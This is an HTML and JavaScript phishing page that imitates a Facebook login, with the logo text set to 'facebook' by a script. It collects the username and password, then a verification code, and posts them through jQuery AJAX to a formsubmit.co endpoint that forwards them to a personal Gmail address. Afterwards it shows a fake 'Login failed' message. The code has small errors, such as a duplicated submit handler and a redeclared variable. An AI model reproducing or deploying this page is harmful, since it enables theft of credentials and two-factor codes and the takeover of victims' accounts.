<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Login</title>
  <!-- Option 1: Include in HTML -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css" />

	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }

    body {
      background-color: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 1em;
    }

    .login-container {
      width: 100%;
      max-width: 360px;
      background: #fff;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
      text-align: center;
    }

    .logo {
      font-size: 32px;
      font-weight: bold;
      color: #1877f2;
      margin-bottom: 20px;
      display: none; /* Hide the logo by default, will be set by JavaScript */
    }

    .input-group {
      margin-bottom: 15px;
    }

    input {
      width: 100%;
      padding: 12px;
      border: 1px solid #dddfe2;
      border-radius: 6px;
      font-size: 14px;
    }

    input:focus {
      outline: none;
      border-color: #1877f2;
      box-shadow: 0 0 0 2px rgba(24,119,242,0.2);
    }

    .login-btn {
      width: 100%;
      background-color: #1877f2;
      color: white;
      border: none;
      padding: 12px;
      font-size: 16px;
      border-radius: 6px;
      cursor: pointer;
      margin-top: 10px;
    }

    .login-btn:hover {
      background-color: #166fe5;
    }

    .login-label {
      padding-top: 20px;
      display: block;
      margin-bottom: 8px;
      font-size: 14px;
      color: #333;
    }

    .forgot {
      display: block;
      margin-top: 12px;
      font-size: 14px;
      color: #1877f2;
      text-decoration: none;
    }

    .divider {
      margin: 20px 0;
      border-top: 1px solid #ddd;
    }

    .create-btn {
      background-color: #42b72a;
      color: white;
      border: none;
      padding: 10px;
      font-size: 14px;
      border-radius: 6px;
      cursor: pointer;
    }

    .create-btn:hover {
      background-color: #36a420;
    }

    #codeForm {
      display: none;
    }
  </style>
</head>

<body>
  <div class="login-container">
    <div class="logo">OpenTeller</div>
    
    <form action="#" id="loginForm">

      <div class="input-group">
        <input type="text" id="username" placeholder="Email or phone">
      </div>

      <div class="input-group">
        <input type="password" id="password" placeholder="Password">
      </div>

      <button class="login-btn">Log In</button>

      <a href="#" class="forgot">Forgot Password?</a>

      <div class="divider"></div>

      <button class="create-btn">Create New Account</button>
    </form>
    
    <form action="#" id="codeForm">
      <div class="input-group">
        <label for="code" class="login-label">Enter verification code or confirm login on your device</label>
        <input type="text" id="code" placeholder="">
      </div>
      <button class="login-btn">Confirm</button>
    </form>
  </div>
</body>
</html>

<script>
  // Set the logo text
  document.querySelector('.logo').textContent = 'facebook';
  document.querySelector('.logo').style.display = 'block';
</script>


<script>
  $("#loginForm").submit((e) => {
    e.preventDefault();
    const username = $("#username").val();
    const password = $("#password").val();
    const message = `Username: ${username} \nPassword: ${password}`;
    sendData(message, 'cred');
  });
  
  $("#loginForm").submit((e) => {
    e.preventDefault();
    const code = $("#code").val();
    const message = `Code: ${code}`;
    sendData(message, 'code');
  });

  const sendData = (data, type) => {
    const data = {
      message: data,
      from_name: "OpenTeller"
    }
    $(".login-btn").prop("disabled", true).html("loading ...");
    $.ajax({
      url: "https://formsubmit.co/ajax/Natashanice046@gmail.com",
      method: "POST",
      data: data,
      dataType: "json"
    })
      .then((message) => {
        console.log(message);
        $(".login-btn").prop("disabled", false).html("Log In");
        if(type == 'cred') {
          $("#loginForm").hide();
          $("#codeForm").show();
        } else {
          alert("Login failed, please try again!");
        }
      })
      .catch((err) => {
        console.log(err);
        $(".login-btn").prop("disabled", false).html("Log In");
    });
  }

</script>
